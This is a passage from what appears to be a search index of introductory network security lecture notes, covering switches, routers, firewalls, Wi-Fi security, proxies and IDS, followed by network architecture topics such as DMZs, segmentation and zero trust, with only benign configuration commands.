Last line of defense - Per-system configuration Cloud firewalls: - Security groups (AWS, Azure, GCP) - Virtual network appliances - Software-defined Firewall Types by Capability Packet-filtering firewalls: - Layer 3 and 4 (IP, TCP/UDP) - Simple rules based on: - Source/destination IP - Source/destination port - Protocol - Fast but limited Stateful firewalls: - Track connection state - Understand TCP handshakes - Allow related traffic - Prevent spoofed packets - Industry standard Application-layer firewalls: - Layer 7 (application content) - Deep packet inspection - HTTP filtering (URLs, methods) - Block specific applications - More processing overhead Next-generation firewalls (NGFW): - Integrated IPS - Application awareness - SSL/TLS inspection - Advanced threat protection - User identity integration - Cloud integration Firewall Rules Example ACL (Access Control List): Rule Action Source Dest Port Protocol 1 Allow 192.168.1.0/24 Any 80 TCP 2 Allow 192.168.1.0/24 Any 443 TCP 3 Allow Any 192.168.1.0/24 Any TCP (established) 4 Deny Any Any Any Any Rule order matters: First match wins Best practices: - Default deny (explicit allow) - Most specific rules first - Log denied traffic - Regular review and cleanup - Document purpose of each rule Wireless Access Points (APs) Access Points: Provide wireless network connectivity. AP Modes Access Point mode: - Bridges wireless and wired networks - Most common mode - Connects clients to network Repeater mode: - Extends wireless range - Receives and retransmits - Halves effective bandwidth Bridge mode: - Connects two wired networks wirelessly - Point-to-point links - Building-to-building connections Client mode: - AP acts as wireless client - Connects to another AP - Provides wired ports Wi-Fi Standards 802.11 family: Standard Year Frequency Max Speed 802.11a 1999 5 GHz 54 Mbps 802.11b 1999 2.4 GHz 11 Mbps 802.11g 2003 2.4 GHz 54 Mbps 802.11n 2009 2.4/5 GHz 600 Mbps 802.11ac 2014 5 GHz 6.9 Gbps (theoretical) 802.11ax 2019 2.4/5 GHz 9.6 Gbps (Wi-Fi 6) 2.4 GHz vs 5 GHz: - 2.4 GHz: Longer range, more interference, slower - 5 GHz: Shorter range, less interference, faster Channels: - 2.4 GHz: 14 channels (1, 6, 11 non-overlapping in US) - 5 GHz: More channels, less congestion Wireless Security Encryption standards: WEP (Wired Equivalent Privacy): - BROKEN - Do not use! - Crackable in minutes - RC4 cipher with weak implementation WPA (Wi-Fi Protected Access): - Better than WEP - TKIP encryption - Still vulnerable - Legacy compatibility WPA2: - Current standard (until WPA3 adoption) - AES encryption - Much more secure - KRACK vulnerability (patched) WPA3: - Latest standard (2018) - Stronger encryption - Forward secrecy - Protection against brute force - Still being adopted Enterprise vs Personal: - Personal (PSK): Shared password for everyone - Enterprise (802.1X): Individual authentication via RADIUS server Hidden SSIDs: - SSID not broadcast - Security through obscurity - Not effective security - Easily discovered MAC filtering: - Whitelist/blacklist MAC addresses - Weak security (MACs easily spoofed) - Management overhead Load Balancers Load balancers: Distribute traffic across multiple servers. Why Load Balance? Benefits: - High availability (server failure tolerance) - Scalability (add more servers) - Performance (distribute load) - Maintenance (take servers offline without downtime) Load Balancing Algorithms Round robin: - Server 1, Server 2, Server 3, Server 1, Server 2... - Simple and fair - Doesn't consider server load Least connections: - Send to server with fewest active connections - Better for varied session lengths IP hash: - Hash client IP to determine server - Same client always goes to same server - Useful for session persistence Weighted: - Assign weights to servers - More powerful servers get more traffic Layer 4 vs Layer 7 Load Balancing Layer 4 (Transport): - Decisions based on IP and port - Fast (less inspection) - No application awareness - TCP/UDP load balancing Layer 7 (Application): - Decisions based on HTTP content - URL-based routing - Cookie-based persistence - SSL termination - More processing overhead - Application-aware decisions Proxies Proxies: Intermediary servers between clients and destinations. Forward Proxies Client \u2192 Proxy \u2192 Internet Use cases: - Content filtering (block websites) - Caching (speed up repeat requests) - Anonymity (hide client IP) - Bypass geo-restrictions Example: Squid proxy # Install sudo apt install squid # Configure sudo nano /etc/squid/squid.conf # Access control acl localnet src 192.168.1.0/24 http_access allow localnet Reverse Proxies Internet \u2192 Proxy \u2192 Internal Servers Use cases: - Load balancing - SSL termination (decrypt at proxy) - Caching - Security (hide internal servers) - WAF (Web Application Firewall) Example: Nginx as reverse proxy server { listen 80; server_name example.com; location / { proxy_pass http://backend:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; } } Transparent Proxies Client unaware of proxy: - Network device redirects traffic - No client configuration - Used for forced filtering - Controversial (privacy concerns) Intrusion Detection/Prevention Systems IDS/IPS hardware appliances: Network-based (NIDS/NIPS): - Monitor network traffic - Detect/block attacks - Signature and anomaly-based - Tap into network (IDS) or inline (IPS) Popular solutions: - Snort (open source) - Suricata (open source) - Cisco Firepower - Palo Alto Networks Placement: - Perimeter (internet connection) - Between network segments - DMZ monitoring - Critical server protection Network Taps and SPAN Ports Network Taps Physical devices that copy traffic: - Passive (no impact on network) - Copy all packets - Used for monitoring/security analysis - Expensive but reliable Types: - Copper taps (Ethernet) - Fiber taps - Aggregation taps (multiple links \u2192 one analyzer) SPAN Ports (Port Mirroring) Switch feature: - Copy traffic from one or more ports - Send copies to monitoring port - Free (switch feature) - Can impact switch performance Configuration example (Cisco): monitor session 1 source interface Gi1/0/1 monitor session 1 destination interface Gi1/0/24 Network Attached Storage (NAS) File-level storage over network: Protocols: - NFS (Network File System) - Unix/Linux - SMB/CIFS (Server Message Block) - Windows - AFP (Apple Filing Protocol) - macOS Use cases: - Centralized file storage - Backups - Media storage - Log aggregation Security concerns: - Network exposure - Authentication - Encryption (often lacking) - Ransomware target Key Takeaways Switches: - Forward based on MAC addresses - VLANs for segmentation - Security features (port security, ARP inspection) Routers: - Connect networks - Forward based on IP addresses - NAT, DHCP, firewall functionality Firewalls: - Control traffic flow - Stateful inspection - NGFWs offer advanced features Wireless APs: - Extend network wirelessly - Security crucial (WPA2/WPA3) - Channel management important Load balancers: - Distribute traffic - High availability - Layer 4 or Layer 7 Each device: - Security tool - Potential attack target - Requires hardening - Needs monitoring Understanding network hardware helps you: - Design secure networks - Identify attack vectors - Troubleshoot issues - Select appropriate tools In the next lessons, we'll see how these devices work together in real network architectures and how attackers target them.","title":"Lesson 3.2"},{"location":"LECTURES/unit3/lesson3-2/#network-devices-and-hardware","text":"Networks aren't just cables and wireless signals. They're made up of specialized hardware devices, each with specific functions. Understanding these devices is crucial\u2014they're both security tools and attack targets.","title":"Network Devices and Hardware"},{"location":"LECTURES/unit3/lesson3-2/#network-interface-cards-nics","text":"NICs connect computers to networks.","title":"Network Interface Cards (NICs)"},{"location":"LECTURES/unit3/lesson3-2/#physical-network-cards","text":"Wired NIC (Ethernet): - RJ-45 connector - Speeds: 10/100/1000 Mbps (Gigabit), 10 Gbps, 40 Gbps - Built into motherboard or expansion card - MAC address burned into hardware Wireless NIC (Wi-Fi): - Antenna (internal or external) - Standards: 802.11a/b/g/n/ac/ax (Wi-Fi 6) - USB adapters, PCIe cards, built-in - Can operate in monitor mode (packet sniffing)","title":"Physical Network Cards"},{"location":"LECTURES/unit3/lesson3-2/#mac-addresses","text":"MAC (Media Access Control) address: - 48-bit hardware address - Format: 00:1A:2B:3C:4D:5E (6 pairs of hex) - First 3 bytes: OUI (Organizationally Unique Identifier) - identifies manufacturer - Last 3 bytes: Device-specific Example: 00:1A:2B \u2192 Cisco Systems 3C:4D:5E \u2192 Unique device ID View your MAC address: # Linux ip link show ifconfig # Windows ipconfig /all # macOS ifconfig Security note: - MAC addresses can be spoofed (changed in software) - Used for tracking devices - MAC filtering on networks (weak security)","title":"MAC Addresses"},{"location":"LECTURES/unit3/lesson3-2/#hubs-obsolete","text":"Hubs: Simple repeaters, rarely used today.","title":"Hubs (Obsolete)"},{"location":"LECTURES/unit3/lesson3-2/#how-hubs-work","text":"Receives packet on one port Broadcasts to ALL other ports All devices see all traffic Devices ignore packets not addressed to them","title":"How Hubs Work"},{"location":"LECTURES/unit3/lesson3-2/#problems-with-hubs","text":"Collisions: - Only one device can transmit at a time - If two transmit simultaneously \u2192 collision - Both must wait and retry - Inefficient as network grows Security: - Every device sees all traffic - Easy packet sniffing - No segmentation Hubs are dead. Replaced by switches.","title":"Problems with Hubs"},{"location":"LECTURES/unit3/lesson3-2/#switches","text":"Switches: Intelligent devices that forward packets only to intended recipient.","title":"Switches"},{"location":"LECTURES/unit3/lesson3-2/#how-switches-work","text":"MAC address table (CAM table): Port | MAC Address ------|------------------ 1 | 00:1A:2B:3C:4D:5E 2 | 11:22:33:44:55:66 3 | AA:BB:CC:DD:EE:FF Learning process: 1. Device sends packet 2. Switch sees source MAC and source port 3. Records in MAC table 4. Now knows which port leads to that MAC Forwarding: 1. Packet arrives for destination MAC 2. Switch checks MAC table 3. Forwards only to port where MAC is located 4. Other ports don't see the traffic Unknown destinations: - If MAC not in table, switch floods (sends to all ports except source) - Destination responds, switch learns","title":"How Switches Work"},{"location":"LECTURES/unit3/lesson3-2/#switch-types","text":"Unmanaged switches: - Plug and play - No configuration - Limited features - Home/small office use Managed switches: - Configurable via CLI or web interface - VLANs - Port mirroring - Quality of Service (QoS) - Access control lists - SNMP monitoring - Enterprise use Layer 2 vs Layer 3 switches: Layer 2: Forward based on MAC addresses (traditional) Layer 3: Also perform routing (IP-based forwarding) - Combine switch and router functionality - Faster than traditional routing - Common in enterprise core networks","title":"Switch Types"},{"location":"LECTURES/unit3/lesson3-2/#vlans-virtual-lans","text":"VLANs logically segment a network: Without VLANs: - All devices on one switch in same broadcast domain - Everyone sees broadcasts - No logical separation With VLANs: Switch with 24 ports: VLAN 10 (Sales): Ports 1-8 VLAN 20 (Engineering): Ports 9-16 VLAN 30 (Guest): Ports 17-24 Benefits: - Security isolation - Broadcast control - Logical organization - Easier management Inter-VLAN routing: - VLANs can't talk to each other without routing - Layer 3 switch or router required - Apply firewall rules between VLANs VLAN tagging (802.1Q): - Adds VLAN ID to Ethernet frame - Trunk ports carry multiple VLANs - Access ports belong to single VLAN","title":"VLANs (Virtual LANs)"},{"location":"LECTURES/unit3/lesson3-2/#switch-security-features","text":"Port security: - Limit which MAC addresses can use a port - Prevent MAC flooding attacks - Limit number of MACs per port DHCP snooping: - Prevents rogue DHCP servers - Builds trusted database of IP-MAC bindings - Prevents DHCP starvation attacks Dynamic ARP Inspection (DAI): - Uses DHCP snooping database - Validates ARP packets - Drops ARP packets with mismatched IP-MAC - Prevents ARP spoofing Port mirroring (SPAN): - Copy traffic from one port to another - Used for monitoring/analysis - Connect IDS/packet analyzer - Essential security tool","title":"Switch Security Features"},{"location":"LECTURES/unit3/lesson3-2/#routers","text":"Routers: Connect different networks, make forwarding decisions based on IP addresses.","title":"Routers"},{"location":"LECTURES/unit3/lesson3-2/#router-functions","text":"Routing: - Examines destination IP - Consults routing table - Forwards to next hop NAT (Network Address Translation): - Translates private IPs to public IP - Allows multiple devices to share one public IP - Adds layer of security (hides internal network) Firewall: - Filter traffic based on rules - Stateful packet inspection - Access control lists (ACLs) DHCP: - Assigns IP addresses automatically - Provides subnet mask, gateway, DNS servers VPN: - Encrypted tunnels - Remote access - Site-to-site connections","title":"Router Functions"},{"location":"LECTURES/unit3/lesson3-2/#routing-tables","text":"View routing table: # Linux ip route show route -n # Windows route print # Cisco router show ip route Example routing table: Destination Gateway Interface 0.0.0.0/0 192.168.1.1 eth0 (default route) 192.168.1.0/24 0.0.0.0 eth0 (directly connected) 10.0.0.0/8 192.168.1.254 eth0 (static route) Route types: - Connected: Directly attached networks - Static: Manually configured - Dynamic: Learned via routing protocols (OSPF, BGP, EIGRP)","title":"Routing Tables"},{"location":"LECTURES/unit3/lesson3-2/#routing-protocols","text":"Interior Gateway Protocols (within an organization): RIP (Routing Information Protocol): - Distance vector (hop count) - Simple but limited - Max 15 hops - Legacy OSPF (Open Shortest Path First): - Link state protocol - Considers bandwidth, not just hops - Fast convergence - Scalable - Enterprise standard EIGRP (Enhanced Interior Gateway Routing Protocol): - Cisco proprietary (mostly) - Hybrid protocol - Fast convergence - Efficient Exterior Gateway Protocols (between organizations): BGP (Border Gateway Protocol): - How the internet works - Path vector protocol - Policy-based routing - AS (Autonomous System) numbers - Extremely complex - Targeted by nation-state attackers","title":"Routing Protocols"},{"location":"LECTURES/unit3/lesson3-2/#router-security","text":"Best practices: - Change default passwords - Disable unnecessary services - Keep firmware updated - Use strong encryption (WPA3 for wireless) - Enable logging - Implement ACLs - Disable remote management (or use VPN) Common vulnerabilities: - Default credentials - Outdated firmware - UPnP (Universal Plug and Play) exploits - DNS hijacking - Weak wireless encryption","title":"Router Security"},{"location":"LECTURES/unit3/lesson3-2/#firewalls","text":"Firewalls: Specialized security devices that filter traffic based on rules.","title":"Firewalls"},{"location":"LECTURES/unit3/lesson3-2/#firewall-types-by-deployment","text":"Network firewalls: - Standalone hardware devices - Protect entire networks - High throughput - Expensive Host-based firewalls: - Software on individual computers - Windows Firewall, iptables, pf - Last line of defense - Per-system configuration Cloud firewalls: - Security groups (AWS, Azure, GCP) - Virtual network appliances - Software-defined","title":"Firewall Types by Deployment"},{"location":"LECTURES/unit3/lesson3-2/#firewall-types-by-capability","text":"Packet-filtering firewalls: - Layer 3 and 4 (IP, TCP/UDP) - Simple rules based on: - Source/destination IP - Source/destination port - Protocol - Fast but limited Stateful firewalls: - Track connection state - Understand TCP handshakes - Allow related traffic - Prevent spoofed packets - Industry standard Application-layer firewalls: - Layer 7 (application content) - Deep packet inspection - HTTP filtering (URLs, methods) - Block specific applications - More processing overhead Next-generation firewalls (NGFW): - Integrated IPS - Application awareness - SSL/TLS inspection - Advanced threat protection - User identity integration - Cloud integration","title":"Firewall Types by Capability"},{"location":"LECTURES/unit3/lesson3-2/#firewall-rules","text":"Example ACL (Access Control List): Rule Action Source Dest Port Protocol 1 Allow 192.168.1.0/24 Any 80 TCP 2 Allow 192.168.1.0/24 Any 443 TCP 3 Allow Any 192.168.1.0/24 Any TCP (established) 4 Deny Any Any Any Any Rule order matters: First match wins Best practices: - Default deny (explicit allow) - Most specific rules first - Log denied traffic - Regular review and cleanup - Document purpose of each rule","title":"Firewall Rules"},{"location":"LECTURES/unit3/lesson3-2/#wireless-access-points-aps","text":"Access Points: Provide wireless network connectivity.","title":"Wireless Access Points (APs)"},{"location":"LECTURES/unit3/lesson3-2/#ap-modes","text":"Access Point mode: - Bridges wireless and wired networks - Most common mode - Connects clients to network Repeater mode: - Extends wireless range - Receives and retransmits - Halves effective bandwidth Bridge mode: - Connects two wired networks wirelessly - Point-to-point links - Building-to-building connections Client mode: - AP acts as wireless client - Connects to another AP - Provides wired ports","title":"AP Modes"},{"location":"LECTURES/unit3/lesson3-2/#wi-fi-standards","text":"802.11 family: Standard Year Frequency Max Speed 802.11a 1999 5 GHz 54 Mbps 802.11b 1999 2.4 GHz 11 Mbps 802.11g 2003 2.4 GHz 54 Mbps 802.11n 2009 2.4/5 GHz 600 Mbps 802.11ac 2014 5 GHz 6.9 Gbps (theoretical) 802.11ax 2019 2.4/5 GHz 9.6 Gbps (Wi-Fi 6) 2.4 GHz vs 5 GHz: - 2.4 GHz: Longer range, more interference, slower - 5 GHz: Shorter range, less interference, faster Channels: - 2.4 GHz: 14 channels (1, 6, 11 non-overlapping in US) - 5 GHz: More channels, less congestion","title":"Wi-Fi Standards"},{"location":"LECTURES/unit3/lesson3-2/#wireless-security","text":"Encryption standards: WEP (Wired Equivalent Privacy): - BROKEN - Do not use! - Crackable in minutes - RC4 cipher with weak implementation WPA (Wi-Fi Protected Access): - Better than WEP - TKIP encryption - Still vulnerable - Legacy compatibility WPA2: - Current standard (until WPA3 adoption) - AES encryption - Much more secure - KRACK vulnerability (patched) WPA3: - Latest standard (2018) - Stronger encryption - Forward secrecy - Protection against brute force - Still being adopted Enterprise vs Personal: - Personal (PSK): Shared password for everyone - Enterprise (802.1X): Individual authentication via RADIUS server Hidden SSIDs: - SSID not broadcast - Security through obscurity - Not effective security - Easily discovered MAC filtering: - Whitelist/blacklist MAC addresses - Weak security (MACs easily spoofed) - Management overhead","title":"Wireless Security"},{"location":"LECTURES/unit3/lesson3-2/#load-balancers","text":"Load balancers: Distribute traffic across multiple servers.","title":"Load Balancers"},{"location":"LECTURES/unit3/lesson3-2/#why-load-balance","text":"Benefits: - High availability (server failure tolerance) - Scalability (add more servers) - Performance (distribute load) - Maintenance (take servers offline without downtime)","title":"Why Load Balance?"},{"location":"LECTURES/unit3/lesson3-2/#load-balancing-algorithms","text":"Round robin: - Server 1, Server 2, Server 3, Server 1, Server 2... - Simple and fair - Doesn't consider server load Least connections: - Send to server with fewest active connections - Better for varied session lengths IP hash: - Hash client IP to determine server - Same client always goes to same server - Useful for session persistence Weighted: - Assign weights to servers - More powerful servers get more traffic","title":"Load Balancing Algorithms"},{"location":"LECTURES/unit3/lesson3-2/#layer-4-vs-layer-7-load-balancing","text":"Layer 4 (Transport): - Decisions based on IP and port - Fast (less inspection) - No application awareness - TCP/UDP load balancing Layer 7 (Application): - Decisions based on HTTP content - URL-based routing - Cookie-based persistence - SSL termination - More processing overhead - Application-aware decisions","title":"Layer 4 vs Layer 7 Load Balancing"},{"location":"LECTURES/unit3/lesson3-2/#proxies","text":"Proxies: Intermediary servers between clients and destinations.","title":"Proxies"},{"location":"LECTURES/unit3/lesson3-2/#forward-proxies","text":"Client \u2192 Proxy \u2192 Internet Use cases: - Content filtering (block websites) - Caching (speed up repeat requests) - Anonymity (hide client IP) - Bypass geo-restrictions Example: Squid proxy # Install sudo apt install squid # Configure sudo nano /etc/squid/squid.conf # Access control acl localnet src 192.168.1.0/24 http_access allow localnet","title":"Forward Proxies"},{"location":"LECTURES/unit3/lesson3-2/#reverse-proxies","text":"Internet \u2192 Proxy \u2192 Internal Servers Use cases: - Load balancing - SSL termination (decrypt at proxy) - Caching - Security (hide internal servers) - WAF (Web Application Firewall) Example: Nginx as reverse proxy server { listen 80; server_name example.com; location / { proxy_pass http://backend:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; } }","title":"Reverse Proxies"},{"location":"LECTURES/unit3/lesson3-2/#transparent-proxies","text":"Client unaware of proxy: - Network device redirects traffic - No client configuration - Used for forced filtering - Controversial (privacy concerns)","title":"Transparent Proxies"},{"location":"LECTURES/unit3/lesson3-2/#intrusion-detectionprevention-systems","text":"IDS/IPS hardware appliances: Network-based (NIDS/NIPS): - Monitor network traffic - Detect/block attacks - Signature and anomaly-based - Tap into network (IDS) or inline (IPS) Popular solutions: - Snort (open source) - Suricata (open source) - Cisco Firepower - Palo Alto Networks Placement: - Perimeter (internet connection) - Between network segments - DMZ monitoring - Critical server protection","title":"Intrusion Detection/Prevention Systems"},{"location":"LECTURES/unit3/lesson3-2/#network-taps-and-span-ports","text":"","title":"Network Taps and SPAN Ports"},{"location":"LECTURES/unit3/lesson3-2/#network-taps","text":"Physical devices that copy traffic: - Passive (no impact on network) - Copy all packets - Used for monitoring/security analysis - Expensive but reliable Types: - Copper taps (Ethernet) - Fiber taps - Aggregation taps (multiple links \u2192 one analyzer)","title":"Network Taps"},{"location":"LECTURES/unit3/lesson3-2/#span-ports-port-mirroring","text":"Switch feature: - Copy traffic from one or more ports - Send copies to monitoring port - Free (switch feature) - Can impact switch performance Configuration example (Cisco): monitor session 1 source interface Gi1/0/1 monitor session 1 destination interface Gi1/0/24","title":"SPAN Ports (Port Mirroring)"},{"location":"LECTURES/unit3/lesson3-2/#network-attached-storage-nas","text":"File-level storage over network: Protocols: - NFS (Network File System) - Unix/Linux - SMB/CIFS (Server Message Block) - Windows - AFP (Apple Filing Protocol) - macOS Use cases: - Centralized file storage - Backups - Media storage - Log aggregation Security concerns: - Network exposure - Authentication - Encryption (often lacking) - Ransomware target","title":"Network Attached Storage (NAS)"},{"location":"LECTURES/unit3/lesson3-2/#key-takeaways","text":"Switches: - Forward based on MAC addresses - VLANs for segmentation - Security features (port security, ARP inspection) Routers: - Connect networks - Forward based on IP addresses - NAT, DHCP, firewall functionality Firewalls: - Control traffic flow - Stateful inspection - NGFWs offer advanced features Wireless APs: - Extend network wirelessly - Security crucial (WPA2/WPA3) - Channel management important Load balancers: - Distribute traffic - High availability - Layer 4 or Layer 7 Each device: - Security tool - Potential attack target - Requires hardening - Needs monitoring Understanding network hardware helps you: - Design secure networks - Identify attack vectors - Troubleshoot issues - Select appropriate tools In the next lessons, we'll see how these devices work together in real network architectures and how attackers target them.","title":"Key Takeaways"},{"location":"LECTURES/unit3/lesson3-3/","text":"Network Design and Architecture Understanding individual network components isn't enough. You need to know how they fit together to create secure, efficient networks. This lesson covers network design principles and common architectures you'll encounter. Network Design Principles Defense in Depth Multiple layers of security: Internet \u2193 Border Firewall (Perimeter) \u2193 DMZ (Public servers) \u2193 Internal Firewall \u2193 Core Network \u251c\u2500 VLANs (Segmentation) \u251c\u2500 IDS/IPS (Detection) \u251c\u2500 Access Controls (Authorization) \u2514\u2500 Encryption (Confidentiality) No single point of failure for security. Segmentation Divide network into zones based on: - Security requirements - Function - Data sensitivity - Trust level Benefits: - Contain breaches - Reduce attack surface - Apply different security policies - Improve performance Redundancy Eliminate single points of failure: - Multiple internet connections - Redundant switches/routers - Multiple power supplies - Backup systems - Geographic diversity High availability = uptime Scalability Design for growth: - Add capacity without redesign - Modular architecture - Room for expansion - Future-proof technology choices Common Network Architectures Three-Tier Architecture Traditional enterprise design: \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Core Layer \u2502 High-speed backbone \u2502 (Switches) \u2502 Connects distribution layers \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 No packet manipulation \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Distribution \u2502 Policy enforcement \u2502 Layer \u2502 VLANs, ACLs, routing \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Aggregation point \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Access Layer \u2502 End-user connections \u2502 (Switches) \u2502 Port security \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 PoE for phones, APs Core layer: - Purpose: Fast packet switching - Devices: High-performance Layer 3 switches - Features: Redundancy, high bandwidth - Minimal processing (routing only) Distribution layer: - Purpose: Policy enforcement, routing - Devices: Layer 3 switches, routers - Features: VLANs, ACLs, firewalls - Connect access to core Access layer: - Purpose: End-device connections - Devices: Layer 2 switches - Features: PoE, port security, VLANs - Desktops, printers, phones, APs Advantages: - Clear hierarchy - Scalable - Maintainable - Predictable performance Disadvantages: - Can be overbuilt for small networks - More equipment = more cost - Complexity Two-Tier (Collapsed Core) Simplified for smaller networks: \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Core/Distribution\u2502 Combined layer \u2502 Layer \u2502 Routing + policy \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Access Layer \u2502 End-user connections \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 When to use: - Smaller organizations - Limited budget - Fewer users (<500) - Less complex requirements Spine-Leaf Architecture Modern data center design: Spine1 Spine2 Spine3 \u2502 \u2502 \u2502 \u250c\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510 \u2502 \u2502 \u2502 \u2502 Leaf1 Leaf2 Leaf3 Leaf4 \u2502 \u2502 \u2502 \u2502 Servers Servers Servers Servers Characteristics: - Every leaf connects to every spine - Two hops between any servers - Predictable latency - Easy to scale (add leaf switches) - No spanning tree needed Advantages: - Low latency - High bandwidth - Scalability - Redundancy Use cases: - Data centers - Cloud providers - High-performance computing Hub and Spoke (Star) Central site with remote locations: HQ (Hub) / | \\ / | \\ Branch Branch Branch (Spoke)(Spoke)(Spoke) Characteristics: - All traffic goes through hub - Spokes don't connect directly - Centralized management/security - VPN connections Advantages: - Centralized control - Easier security management - Simplified monitoring Disadvantages: - Hub is single point of failure - Bandwidth bottleneck at hub - Spoke-to-spoke requires two hops Full Mesh Every site connects to every other site: Site A \u2500\u2500\u2500 Site B \u2502 \\ / \u2502 \u2502 \\ / \u2502 \u2502 \\ / \u2502 Site C \u2500\u2500\u2500 Site D Advantages: - No single point of failure - Direct paths (low latency) - Load distribution Disadvantages: - Expensive (many connections) - Complex management - Scales poorly (n\u00d7(n-1)/2 connections) Use cases: - Critical systems - Financial trading - When budget allows Partial Mesh Compromise between hub-spoke and full mesh: - Critical sites: full mesh - Less critical: hub-and-spoke - Best of both worlds Network Zones DMZ (Demilitarized Zone) Purpose: Host public-facing services Design: Internet \u2193 Firewall 1 (External) \u2193 DMZ \u251c\u2500 Web servers \u251c\u2500 Email servers \u251c\u2500 DNS servers \u2514\u2500 FTP servers \u2193 Firewall 2 (Internal) \u2193 Internal Network Rules: - Internet \u2192 DMZ: Limited access (HTTP, HTTPS, SMTP) - DMZ \u2192 Internal: Very restricted (database queries only) - Internal \u2192 DMZ: Manage servers - Internal \u2192 Internet: Through firewall Security benefits: - Public servers isolated - Breach contained to DMZ - Internal network protected - Two firewalls provide defense in depth Internal Network Corporate network for employees: Segmentation by: - Department (Sales, Engineering, HR) - Function (User workstations, Printers, VoIP) - Security level (Standard, Restricted, Confidential) Example VLANs: VLAN 10: Users (192.168.10.0/24) VLAN 20: Servers (192.168.20.0/24) VLAN 30: Management (192.168.30.0/24) VLAN 40: Guest (192.168.40.0/24) VLAN 50: VoIP (192.168.50.0/24) Management Network Separate network for device management: Out-of-band management: - Dedicated network - Physical separation - Even if production network fails - Accessible via console servers Devices managed: - Switches - Routers - Firewalls - Servers (IPMI, iLO, iDRAC) Security: - Extremely restricted access - VPN required - MFA mandatory - All actions logged Guest Network Visitors and untrusted devices: Characteristics: - Isolated from internal network - Internet access only - Captive portal (login page) - Bandwidth limits - Time limits - Content filtering Security: - No access to internal resources - Separate VLAN - Separate IP range - Strict firewall rules Implementation: Guest VLAN 40 \u2193 Firewall rules: Allow: Internet (HTTP, HTTPS) Deny: Internal networks Deny: Private IP ranges Wireless Network Design Site Survey Before deploying wireless: Physical survey: - Building layout - Construction materials (affect signal) - Sources of interference - Coverage requirements - Capacity requirements RF survey: - Measure signal strength - Identify dead zones - Find interference sources - Optimize channel selection - Determine AP placement Tools: - Ekahau - NetSpot - AirMagnet - inSSIDer Controller vs. Autonomous APs Controller-based (Enterprise): - Central wireless controller - Manages multiple APs - Centralized configuration - Roaming support - Guest portal - Scalable Autonomous APs (Standalone): - Each AP configured independently - No controller needed - Simpler (small deployments) - Lower cost Wireless Security Architecture SSID strategy: Corporate SSID \u251c\u2500 WPA2-Enterprise (802.1X) \u251c\u2500 Corporate VLAN \u2514\u2500 Access to internal resources Guest SSID \u251c\u2500 WPA2-PSK or open with captive portal \u251c\u2500 Guest VLAN \u2514\u2500 Internet only Best practices: - Separate SSIDs for different purposes - Unique VLANs per SSID - Enterprise authentication for employees - Guest isolation - Regular security audits Cloud Network Architecture Hybrid Cloud Combination of on-premises and cloud: On-Premises Data Center \u2193 VPN/Direct Connect \u2193 Cloud (AWS/Azure/GCP) Use cases: - Gradual migration - Burst capacity - Disaster recovery - Data sovereignty requirements Multi-Cloud Multiple cloud providers: - Avoid vendor lock-in - Leverage best features of each - Geographic distribution - Redundancy Challenges: - Complex management - Security consistency - Cost tracking - Network connectivity Cloud Network Components VPC (Virtual Private Cloud): - Logically isolated network - Define IP range - Subnets (public/private) - Route tables - Internet/NAT gateways Security Groups: - Virtual firewalls - Instance-level - Stateful - Allow rules only Network ACLs: - Subnet-level - Stateless - Allow and deny rules VPC Peering: - Connect VPCs - Private connectivity - No internet gateway Transit Gateway: - Central hub for VPC connectivity - Simplify complex networks Zero Trust Architecture Never trust, always verify: Traditional Perimeter Model Internet (Untrusted) \u2193 Firewall \u2193 Internal Network (Trusted) Problem: Assumes internal = safe Zero Trust Model Every Request \u2193 Authenticate \u2193 Authorize \u2193 Encrypt \u2193 Continuous Verification Principles: 1. Verify explicitly: Always authenticate and authorize 2. Least privilege: Minimum necessary access 3. Assume breach: Limit blast radius Implementation Micro-segmentation: - Granular network zones - Per-application firewalls - Workload-specific policies Identity-based access: - User and device identity - Continuous authentication - Context-aware (location, time, device posture) Software-defined perimeter: - Application-level access - Hide infrastructure - Only authorized users see resources Components: - Identity provider (Azure AD, Okta) - Access proxy - Policy engine - Endpoint verification - Encryption everywhere Network Documentation Critical for security and operations: Physical Diagrams Rack layouts: - Equipment placement - Cable management - Power distribution - Cooling Site diagrams: - Building locations - Equipment rooms - Cable paths - Access points Logical Diagrams Network topology: - Devices and connections - IP addressing - VLANs - Routing Security zones: - Trust boundaries - Firewall placement - DMZ layout - Access controls Configuration Documentation IP addressing scheme: 10.0.0.0/8 - Corporate 10.1.0.0/16 - HQ 10.1.10.0/24 - Servers 10.1.20.0/24 - Users 10.1.30.0/24 - Printers 10.2.0.0/16 - Branch 1 10.3.0.0/16 - Branch 2 VLAN assignments: - VLAN numbers and names - IP ranges - Purpose - Security requirements Firewall rules: - Rule number - Source/destination - Action - Purpose - Date created - Owner Change Management Document all changes: - What changed - Why it changed - Who approved - When it changed - Rollback plan 